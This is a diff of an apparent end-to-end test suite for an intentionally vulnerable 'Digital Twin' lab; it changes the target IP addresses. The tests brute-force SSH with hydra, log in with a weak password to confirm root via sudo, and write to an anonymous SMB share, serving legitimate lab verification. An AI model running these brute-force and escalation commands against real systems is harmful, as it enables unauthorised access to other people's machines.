@@ -129,14 +129,14 @@ test.describe.serial('Digital Twin', () => {
     // Run hydra from the gateway against Server 3
     const hydraOut = dockerExec(
       'ccs_dt_gateway',
-      'hydra -l admin -P /tmp/dict.txt -t 4 -f 10.0.0.3 ssh 2>&1 || true'
+      'hydra -l admin -P /tmp/dict.txt -t 4 -f 10.0.3.3 ssh 2>&1 || true'
     )
     expect(hydraOut).toContain('password123')
 
     // Verify sudo gives root
     const sshOut = dockerExec(
       'ccs_dt_gateway',
-      'sshpass -p password123 ssh -o StrictHostKeyChecking=no admin@10.0.0.3 "sudo id"'
+      'sshpass -p password123 ssh -o StrictHostKeyChecking=no admin@10.0.3.3 "sudo id"'
     )
     expect(sshOut).toContain('uid=0(root)')
   })
@@ -156,7 +156,7 @@ test.describe.serial('Digital Twin', () => {
     // Step 3: Share is world-writable (attacker can upload .so)
     dockerExec(
       'ccs_dt_gateway',
-      'smbclient //10.0.0.6/public -N -c "put /etc/hostname test_upload" 2>&1'
+      'smbclient //10.0.4.6/public -N -c "put /etc/hostname test_upload" 2>&1'
     )
     const uploaded = dockerExec(
       'ccs_dt_server_6',
